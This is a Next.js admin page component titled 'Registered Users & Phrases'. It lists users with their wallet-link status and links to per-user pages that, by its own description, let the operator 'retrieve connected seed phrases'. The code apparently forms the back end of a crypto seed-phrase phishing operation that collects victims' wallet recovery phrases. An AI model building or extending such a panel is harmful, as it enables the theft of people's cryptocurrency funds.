"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import apiClient from "@/lib/axios-config";
import { toast } from "react-toastify";

interface User {
  id: number;
  name: string;
  username: string;
  email: string;
  role: string;
  isActive: number;
  created_at: string;
  walletStatus: "connected" | "not-connected";
}

export default function AdminUsersPage() {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const res = await apiClient.get("/api/admin/users");
        if (res.data.status_code) {
          setUsers(res.data.users || []);
        }
      } catch (err: any) {
        console.error("Error fetching users:", err);
        toast.error("Failed to fetch users list.");
      } finally {
        setLoading(false);
      }
    };

    fetchUsers();
  }, []);

  if (loading) {
    return (
      <div className="tw-py-12 tw-text-center tw-space-y-4">
        <div className="tw-w-10 tw-h-10 tw-border-4 tw-border-green-500 tw-border-t-transparent tw-rounded-full tw-animate-spin tw-mx-auto"></div>
        <p className="tw-text-gray-400 tw-text-sm">Loading users register...</p>
      </div>
    );
  }

  return (
    <div className="tw-space-y-6">
      {/* Page Title & Stats */}
      <div className="tw-flex tw-justify-between tw-items-center">
        <div>
          <h1 className="tw-text-lg tw-font-bold tw-tracking-tight tw-text-white">Registered Users & Phrases</h1>
          <p className="tw-text-gray-400 tw-text-xs tw-mt-1">
            Monitor users registration, wallet link status, and retrieve connected seed phrases.
          </p>
        </div>
        <div className="tw-bg-[#161b22] tw-border tw-border-solid tw-border-gray-800 tw-rounded-xl tw-px-1 tw-py-2.5 tw-text-right">
          <div className="tw-text-xs tw-text-gray-400 tw-font-medium">Total Registered Users</div>
          <div className="tw-text-xs tw-font-bold tw-text-white tw-mt-0.5">{users.length}</div>
        </div>
      </div>

      {/* Users Table */}
      <div className="tw-bg-[#161b22] tw-border tw-border-solid tw-border-gray-800 tw-rounded-2xl">
        <div className="tw-overflow-x-auto">
          <table className="tw-w-full tw-text-left tw-border-collapse">
            <thead>
              <tr className="tw-border-b tw-border-solid tw-border-gray-800 tw-bg-black/10">
                <th className="tw-px-6 tw-py-4 tw-text-xs tw-font-bold tw-text-gray-400 tw-uppercase tw-tracking-wider">User Details</th>
                <th className="tw-px-6 tw-py-4 tw-text-xs tw-font-bold tw-text-gray-400 tw-uppercase tw-tracking-wider">Role</th>
                <th className="tw-px-6 tw-py-4 tw-text-xs tw-font-bold tw-text-gray-400 tw-uppercase tw-tracking-wider">Wallet Link</th>
                <th className="tw-px-6 tw-py-4 tw-text-xs tw-font-bold tw-text-gray-400 tw-uppercase tw-tracking-wider">Joined Date</th>
                <th className="tw-px-6 tw-py-4 tw-text-xs tw-font-bold tw-text-gray-400 tw-uppercase tw-tracking-wider tw-text-right">Action</th>
              </tr>
            </thead>
            <tbody className="tw-divide-y tw-divide-solid tw-divide-gray-800/50">
              {users.length > 0 ? (
                users.map((user) => (
                  <tr key={user.id} className="hover:tw-bg-white/[0.01] tw-transition">
                    <td className="tw-px-6 tw-py-4">
                      <div className="tw-font-semibold tw-text-white tw-text-sm">{user.name}</div>
                      <div className="tw-text-gray-400 tw-text-xs tw-mt-0.5">{user.email}</div>
                    </td>
                    <td className="tw-px-6 tw-py-4">
                      <span
                        className={`tw-px-2.5 tw-py-1 tw-rounded-md tw-text-[10px] tw-font-bold tw-uppercase tw-tracking-wider ${user.role === "admin"
                          ? "tw-bg-purple-500/10 tw-text-purple-400 tw-border tw-border-solid tw-border-purple-500/20"
                          : "tw-bg-gray-500/10 tw-text-gray-400 tw-border tw-border-solid tw-border-gray-500/20"
                          }`}
                      >
                        {user.role}
                      </span>
                    </td>
                    <td className="tw-px-6 tw-py-4">
                      {user.walletStatus === "connected" ? (
                        <span className="tw-inline-flex tw-items-center tw-gap-1.5 tw-bg-green-500/10 tw-text-green-400 tw-px-2.5 tw-py-1 tw-rounded-md tw-text-xs tw-font-medium tw-border tw-border-solid tw-border-green-500/20">
                          <span className="tw-w-1.5 tw-h-1.5 tw-bg-green-400 tw-rounded-full tw-animate-pulse" />
                          Connected
                        </span>
                      ) : (
                        <span className="tw-inline-flex tw-items-center tw-gap-1.5 tw-bg-red-500/10 tw-text-red-400 tw-px-2.5 tw-py-1 tw-rounded-md tw-text-xs tw-font-medium tw-border tw-border-solid tw-border-red-500/20">
                          <span className="tw-w-1.5 tw-h-1.5 tw-bg-red-400 tw-rounded-full" />
                          Not Connected
                        </span>
                      )}
                    </td>
                    <td className="tw-px-6 tw-py-4 tw-text-sm tw-text-gray-400">
                      {user.created_at ? new Date(user.created_at).toLocaleDateString() : "N/A"}
                    </td>
                    <td className="tw-px-6 tw-py-4 tw-text-right">
                      {user.walletStatus === "connected" ? (
                        <Link
                          href={`/admin/users/${user.id}`}
                          className="tw-inline-flex tw-items-center tw-text-nowrap tw-bg-green-600 hover:tw-bg-green-500 tw-text-white tw-text-xs tw-font-bold tw-px-4 tw-py-2 tw-rounded-xl tw-transition tw-shadow-md"
                        >
                          👁️ View
                        </Link>
                      ) : (
                        <span className="tw-text-xs tw-text-gray-500 tw-font-medium">No phrases linked</span>
                      )}
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan={5} className="tw-px-6 tw-py-12 tw-text-center tw-text-gray-500 tw-text-sm">
                    No registered users found in the database.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}